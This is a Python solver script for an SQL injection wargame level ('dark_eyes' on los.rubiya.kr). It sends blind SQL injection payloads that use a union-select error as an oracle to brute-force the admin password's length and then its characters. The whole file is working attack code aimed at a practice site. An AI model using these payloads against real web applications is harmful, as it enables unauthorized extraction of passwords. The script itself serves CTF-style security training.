import urllib3
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?"
header = {"Cookie":"YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"
ans = ''

for i in range(0,40):
    query = "pw=' or id='admin' and (select 1 union select(length(pw)={}))%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    #print(req.text)
    if "select id from prob_dark_eyes" in req.text:
        length = i
        break

print("password length is : ",length)


for i in range(1, length+1):
    for j in ch:
        query = "pw=' or id='admin' and (select 1 union select (ord(substr(pw,{},1))={}))%23".format(i,ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "select id from prob_dark_eyes" in req.text:
            ans += j
            print(j)
            break

print("pw: "+ans)



